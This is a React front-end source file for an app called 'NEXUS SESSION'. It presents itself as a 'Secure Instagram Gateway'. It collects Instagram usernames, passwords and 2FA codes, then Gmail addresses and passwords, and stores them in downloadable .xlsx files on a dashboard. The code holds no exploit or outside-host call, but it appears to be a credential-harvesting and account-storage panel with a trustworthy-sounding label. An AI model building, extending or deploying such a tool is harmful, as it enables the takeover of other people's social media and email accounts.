import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Shield, Upload, FileText, Download, Edit2, Trash2, Check, X, Disc } from 'lucide-react';

// --- Constants ---
const API_URL = '/api'; // Relative path for deployment

// --- Components ---

const LoadingSpinner = () => (
  <div className="flex justify-center items-center">
    <div className="w-6 h-6 border-2 border-primary-blue border-t-transparent rounded-full animate-spin"></div>
  </div>
);

const Modal = ({ isOpen, onClose, children }) => (
  <AnimatePresence>
    {isOpen && (
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
      >
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ scale: 0.9, opacity: 0 }}
          className="bg-card-bg border border-gray-700 p-6 w-full max-w-md relative"
        >
          <button onClick={onClose} className="absolute top-4 right-4 text-gray-500 hover:text-white">
            <X size={20} />
          </button>
          {children}
        </motion.div>
      </motion.div>
    )}
  </AnimatePresence>
);

// --- Main App ---

function App() {
  const [view, setView] = useState('login'); // login, gmail, dashboard
  const [sessionUser, setSessionUser] = useState('');
  const [gmail, setGmail] = useState('');
  const [gmailPass, setGmailPass] = useState('');
  const [files, setFiles] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  // Modals
  const [show2FAModal, setShow2FAModal] = useState(false);
  const [twoFACode, setTwoFACode] = useState('');
  const [showEditModal, setShowEditModal] = useState(false);
  const [editFile, setEditFile] = useState(null);
  const [editGmail, setEditGmail] = useState('');
  const [editGmailPass, setEditGmailPass] = useState('');

  // Login Inputs
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const fetchFiles = async () => {
    try {
      const res = await fetch(`${API_URL}/files`);
      const data = await res.json();
      setFiles(data);
    } catch (err) {
      console.error("Failed to fetch files", err);
    }
  };

  useEffect(() => {
    if (view === 'dashboard') {
      fetchFiles();
    }
  }, [view]);

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const res = await fetch(`${API_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });

      const data = await res.json();

      if (!res.ok) throw new Error(data.detail || 'Login failed');

      if (data.status === 'pending' && data.requires_2fa) {
        setSessionUser(username);
        setShow2FAModal(true);
      } else {
        setSessionUser(username);
        setView('gmail');
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handle2FASubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
        const res = await fetch(`${API_URL}/2fa`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: sessionUser, code: twoFACode }),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.detail || '2FA failed');

        setShow2FAModal(false);
        setView('gmail');
    } catch(err) {
        setError(err.message);
    } finally {
        setLoading(false);
    }
  };

  const handleGmailSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
        const res = await fetch(`${API_URL}/save`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: sessionUser, gmail, gmail_password: gmailPass }),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.detail || 'Save failed');

        // Reset and go to dashboard
        setGmail('');
        setGmailPass('');
        setUsername('');
        setPassword('');
        setView('dashboard');
    } catch(err) {
        setError(err.message);
    } finally {
        setLoading(false);
    }
  };

  const handleFileUpload = async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('file', file);

    try {
        const res = await fetch(`${API_URL}/upload`, {
            method: 'POST',
            body: formData
        });
        if(!res.ok) {
             const d = await res.json();
             throw new Error(d.detail);
        }
        fetchFiles();
    } catch(err) {
        alert("Upload failed: " + err.message);
    }
  };

  const handleDownload = (filename) => {
      window.open(`${API_URL}/download/${filename}`, '_blank');
  };

  const handleDelete = async (filename) => {
      if(!confirm(`Delete ${filename}?`)) return;
      await fetch(`${API_URL}/delete/${filename}`, { method: 'DELETE' });
      fetchFiles();
  };

  const handleRename = async (oldName) => {
      const newName = prompt("Enter new filename (with .xlsx):", oldName);
      if(!newName) return;
      try {
        const res = await fetch(`${API_URL}/rename`, {
            method: 'POST',
             headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ old_filename: oldName, new_filename: newName })
        });
        if(!res.ok) throw new Error("Rename failed");
        fetchFiles();
      } catch(e) {
          alert(e.message);
      }
  };

  const openEditModal = (file) => {
      setEditFile(file.filename);
      setEditGmail('');
      setEditGmailPass('');
      setShowEditModal(true);
  };

  const handleEditSubmit = async (e) => {
      e.preventDefault();
      setLoading(true);
      try {
          const res = await fetch(`${API_URL}/edit`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                  filename: editFile,
                  gmail: editGmail,
                  gmail_password: editGmailPass
              })
          });
          if (!res.ok) throw new Error("Edit failed");
          setShowEditModal(false);
          // Optional: You might want to refresh the file list if size changed or timestamps update
          fetchFiles();
      } catch(e) {
          alert(e.message);
      } finally {
          setLoading(false);
      }
  };

  return (
    <div className="min-h-screen flex flex-col items-center p-4 md:p-10 relative">
      {/* Background Ambience */}
      <div className="fixed inset-0 bg-gradient-to-br from-dark-bg via-[#0a0a1a] to-black z-[-1]"></div>
      <div className="fixed inset-0 opacity-20 pointer-events-none" style={{ backgroundImage: 'radial-gradient(circle at 50% 50%, #00F0FF 1px, transparent 1px)', backgroundSize: '40px 40px' }}></div>

      {/* Header */}
      <header className="w-full max-w-5xl flex justify-between items-center mb-12 border-b border-gray-800 pb-4">
        <div className="flex items-center gap-3">
          <Terminal className="text-primary-blue" size={32} />
          <h1 className="text-3xl font-bold tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-primary-blue to-white">
            NEXUS SESSION
          </h1>
        </div>
        {view !== 'login' && (
           <button onClick={() => setView('login')} className="text-gray-400 hover:text-white transition-colors">
             New Login
           </button>
        )}
      </header>

      {/* Main Content Area */}
      <main className="w-full max-w-5xl flex-grow flex flex-col items-center justify-center">
        <AnimatePresence mode="wait">

          {/* LOGIN VIEW */}
          {view === 'login' && (
            <motion.div
              key="login"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="w-full max-w-md"
            >
              <div className="card shadow-[0_0_20px_rgba(0,240,255,0.1)]">
                <div className="flex flex-col items-center mb-8">
                  <Shield size={48} className="text-primary-gold mb-4" />
                  <h2 className="text-2xl font-bold">AUTHENTICATION</h2>
                  <p className="text-gray-500 text-sm">Secure Instagram Gateway</p>
                </div>

                <form onSubmit={handleLogin} className="space-y-6">
                  <div>
                    <label className="block text-xs font-bold text-primary-blue mb-2 uppercase tracking-widest">Username</label>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="input-field"
                      placeholder="Instagram Username"
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-primary-blue mb-2 uppercase tracking-widest">Password</label>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="input-field"
                      placeholder="••••••••"
                      required
                    />
                  </div>

                  {error && <p className="text-red-500 text-sm text-center">{error}</p>}

                  <button type="submit" className="btn-primary w-full flex justify-center" disabled={loading}>
                    {loading ? <LoadingSpinner /> : 'INITIATE LOGIN'}
                  </button>
                </form>

                 <div className="mt-8 pt-6 border-t border-gray-800 text-center">
                    <button onClick={() => setView('dashboard')} className="text-gray-500 hover:text-primary-blue text-sm transition-colors">
                        View Existing Files
                    </button>
                 </div>
              </div>
            </motion.div>
          )}

          {/* GMAIL VIEW */}
          {view === 'gmail' && (
            <motion.div
              key="gmail"
              initial={{ opacity: 0, x: 50 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -50 }}
              className="w-full max-w-md"
            >
               <div className="card shadow-[0_0_20px_rgba(212,175,55,0.1)] border-primary-gold/30">
                <div className="flex flex-col items-center mb-8">
                  <div className="w-12 h-12 rounded-full bg-primary-gold/20 flex items-center justify-center mb-4 text-primary-gold">
                      <Check size={24} />
                  </div>
                  <h2 className="text-2xl font-bold text-white">LOGIN SUCCESS</h2>
                  <p className="text-gray-400 text-sm text-center mt-2">
                    Instagram session secured. <br/> Please provide recovery details for storage.
                  </p>
                </div>

                <form onSubmit={handleGmailSubmit} className="space-y-6">
                  <div>
                    <label className="block text-xs font-bold text-primary-gold mb-2 uppercase tracking-widest">Gmail Address</label>
                    <input
                        type="email"
                        value={gmail}
                        onChange={(e) => setGmail(e.target.value)}
                        className="input-field focus:border-primary-gold"
                        placeholder="user@gmail.com"
                        required
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-primary-gold mb-2 uppercase tracking-widest">Gmail Password</label>
                    <input
                        type="text"
                        value={gmailPass}
                        onChange={(e) => setGmailPass(e.target.value)}
                        className="input-field focus:border-primary-gold"
                        placeholder="Password"
                        required
                    />
                  </div>

                  {error && <p className="text-red-500 text-sm text-center">{error}</p>}

                  <button type="submit" className="btn-gold w-full flex justify-center" disabled={loading}>
                     {loading ? <LoadingSpinner /> : 'SAVE & FINISH'}
                  </button>
                </form>
              </div>
            </motion.div>
          )}

          {/* DASHBOARD VIEW */}
          {view === 'dashboard' && (
            <motion.div
              key="dashboard"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="w-full"
            >
              <div className="flex justify-between items-center mb-6">
                  <h2 className="text-2xl font-bold font-orbitron">DATA REPOSITORY</h2>
                  <div className="relative">
                      <input
                        type="file"
                        id="file-upload"
                        className="hidden"
                        accept=".xlsx"
                        onChange={handleFileUpload}
                      />
                      <label htmlFor="file-upload" className="btn-primary cursor-pointer flex items-center gap-2">
                          <Upload size={18} /> UPLOAD
                      </label>
                  </div>
              </div>

              {files.length === 0 ? (
                  <div className="text-center py-20 border border-dashed border-gray-800 rounded-lg">
                      <p className="text-gray-500">No session files found.</p>
                  </div>
              ) : (
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                      {files.map((file) => (
                          <motion.div
                            key={file.filename}
                            layout
                            className="card group relative overflow-hidden"
                          >
                              <div className="absolute top-0 left-0 w-1 h-full bg-primary-blue opacity-0 group-hover:opacity-100 transition-opacity"></div>
                              <div className="flex items-start justify-between mb-4">
                                  <div className="p-3 bg-gray-900 rounded-lg">
                                      <FileText className="text-primary-blue" size={24} />
                                  </div>
                                  <span className="text-xs text-gray-500 font-mono">{file.created_at.split('T')[0]}</span>
                              </div>
                              <h3 className="text-lg font-bold mb-1 truncate">{file.filename}</h3>
                              <p className="text-xs text-gray-500 mb-6 font-mono">{(file.size / 1024).toFixed(2)} KB</p>

                              <div className="flex gap-2 opacity-100 md:opacity-0 md:translate-y-2 group-hover:opacity-100 group-hover:translate-y-0 transition-all duration-300">
                                  <button
                                    onClick={() => openEditModal(file)}
                                    className="p-2 bg-gray-800 hover:bg-green-500 hover:text-white transition-colors rounded" title="Edit">
                                      <Edit2 size={16} />
                                  </button>
                                  <button
                                    onClick={() => handleDownload(file.filename)}
                                    className="p-2 bg-gray-800 hover:bg-primary-blue hover:text-black transition-colors rounded" title="Download">
                                      <Download size={16} />
                                  </button>
                                  <button
                                    onClick={() => handleRename(file.filename)}
                                    className="p-2 bg-gray-800 hover:bg-white hover:text-black transition-colors rounded" title="Rename">
                                      <Disc size={16} />
                                  </button>
                                  <button
                                    onClick={() => handleDelete(file.filename)}
                                    className="p-2 bg-gray-800 hover:bg-red-500 hover:text-white transition-colors rounded" title="Delete">
                                      <Trash2 size={16} />
                                  </button>
                              </div>
                          </motion.div>
                      ))}
                  </div>
              )}
            </motion.div>
          )}

        </AnimatePresence>
      </main>

      {/* 2FA Modal */}
      <Modal isOpen={show2FAModal} onClose={() => setShow2FAModal(false)}>
         <h3 className="text-xl font-bold mb-4 text-center">2FA REQUIRED</h3>
         <p className="text-gray-400 text-sm text-center mb-6">Enter the code sent to your device/SMS.</p>
         <form onSubmit={handle2FASubmit} className="space-y-4">
             <input
                type="text"
                value={twoFACode}
                onChange={(e) => setTwoFACode(e.target.value)}
                className="input-field text-center text-2xl tracking-widest"
                placeholder="000 000"
                autoFocus
             />
             <button type="submit" className="btn-primary w-full" disabled={loading}>
                 {loading ? <LoadingSpinner /> : 'VERIFY'}
             </button>
         </form>
      </Modal>

      {/* Edit Modal */}
      <Modal isOpen={showEditModal} onClose={() => setShowEditModal(false)}>
         <h3 className="text-xl font-bold mb-4 text-center">EDIT ACCOUNT DATA</h3>
         <p className="text-gray-400 text-sm text-center mb-6">Update recovery information for {editFile}.</p>
         <form onSubmit={handleEditSubmit} className="space-y-4">
             <div>
                <label className="block text-xs font-bold text-gray-400 mb-2">NEW GMAIL</label>
                 <input
                    type="email"
                    value={editGmail}
                    onChange={(e) => setEditGmail(e.target.value)}
                    className="input-field"
                    placeholder="New Gmail..."
                    required
                 />
             </div>
             <div>
                <label className="block text-xs font-bold text-gray-400 mb-2">NEW PASSWORD</label>
                 <input
                    type="text"
                    value={editGmailPass}
                    onChange={(e) => setEditGmailPass(e.target.value)}
                    className="input-field"
                    placeholder="New Password..."
                    required
                 />
             </div>
             <button type="submit" className="btn-primary w-full" disabled={loading}>
                 {loading ? <LoadingSpinner /> : 'UPDATE FILE'}
             </button>
         </form>
      </Modal>

    </div>
  );
}

export default App;
